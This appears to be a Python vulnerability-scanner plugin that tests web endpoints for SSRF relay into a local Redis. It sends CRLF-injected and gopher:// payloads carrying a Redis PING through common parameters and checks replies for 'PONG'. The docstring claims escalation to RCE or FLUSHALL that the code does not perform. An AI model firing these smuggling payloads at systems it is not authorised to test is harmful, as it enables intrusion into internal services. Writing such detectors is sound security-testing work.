"""
Plugin to detect Message Broker SSRF Relay (Kafka/RabbitMQ/Redis via HTTP)
CVSS: 9.9 (Critical)

Targets Event-Driven Microservices Architectures.
Detects Blind SSRF vulnerabilities and attempts to elevate them to Remote Code Execution
or destructive actions (e.g., FLUSHALL) by smuggling binary protocols (RESP) 
via HTTP CRLF injection or gopher:// handlers.
"""

import requests
import urllib3
import logging
from typing import Optional, Dict, Any

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger("Cascavel.Plugins.BrokerSSRFRelay")

def detect_ssrf_relay(url: str, session: requests.Session) -> tuple[bool, str]:
    """
    Attempts to use known SSRF parameters to smuggle Redis RESP commands 
    and verify if the broker processes them.
    """
    # Common parameters that might be vulnerable to SSRF
    ssrf_params = ['url', 'uri', 'target', 'proxy', 'webhook', 'callback', 'redirect']
    
    # We attempt to relay a Redis PING command via HTTP protocol smuggling (CRLF)
    # Redis RESP protocol format for "PING":
    # *1\r\n$4\r\nPING\r\n
    
    # HTTP payload with CRLF injection targeting a local Redis instance (127.0.0.1:6379)
    # The HTTP request headers end with \r\n\r\n, and we append the Redis command.
    crlf_redis_payload = "http://127.0.0.1:6379/\r\n\r\n*1\r\n$4\r\nPING\r\n"
    
    # Gopher payload targeting local Redis
    # gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
    gopher_redis_payload = "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a"

    payloads = [crlf_redis_payload, gopher_redis_payload]
    
    test_endpoints = [
        f"{url}/api/fetch",
        f"{url}/webhook",
        f"{url}/proxy",
        f"{url}/upload"
    ]

    for endpoint in test_endpoints:
        for param in ssrf_params:
            for payload in payloads:
                try:
                    # Test via GET
                    resp = session.get(endpoint, params={param: payload}, timeout=5, verify=False)
                    
                    # If the SSRF successfully relayed the payload to Redis,
                    # Redis responds with "+PONG". Sometimes the web app reflects this error/response.
                    if "+PONG" in resp.text or "PONG" in resp.text:
                        return True, f"SSRF successfully relayed binary protocol (RESP) to local broker via parameter '{param}' using payload: {payload[:30]}..."
                        
                    # Test via POST JSON
                    resp_post = session.post(endpoint, json={param: payload}, timeout=5, verify=False)
                    if "+PONG" in resp_post.text or "PONG" in resp_post.text:
                        return True, f"SSRF successfully relayed binary protocol (RESP) via JSON parameter '{param}'."

                except requests.exceptions.RequestException:
                    pass

    return False, ""

def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, Any]]:
    """
    Checks for Message Broker SSRF Relay vulnerabilities.
    """
    vulnerability = "Message Broker SSRF Relay (HTTP to Binary Protocol)"
    severity = "CRITICAL"
    description = (
        "The application is vulnerable to an advanced Server-Side Request Forgery (SSRF). "
        "Unlike standard SSRF that only reads metadata (IMDS), this vulnerability allows "
        "an attacker to smuggle binary protocol commands (e.g., Redis RESP, Kafka, RabbitMQ) "
        "into the internal network using HTTP CRLF injection or the `gopher://` handler. "
        "This enables direct interaction with internal message brokers, allowing cache poisoning, "
        "message queue injection, or Remote Code Execution."
    )

    url = f"https://{target}" if 443 in ports else f"http://{target}"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    })

    is_vuln, evidence = detect_ssrf_relay(url, session)

    if is_vuln:
        return {
            "vulnerability": vulnerability,
            "severity": severity,
            "description": description,
            "endpoint": url,
            "evidence": evidence
        }

    return None
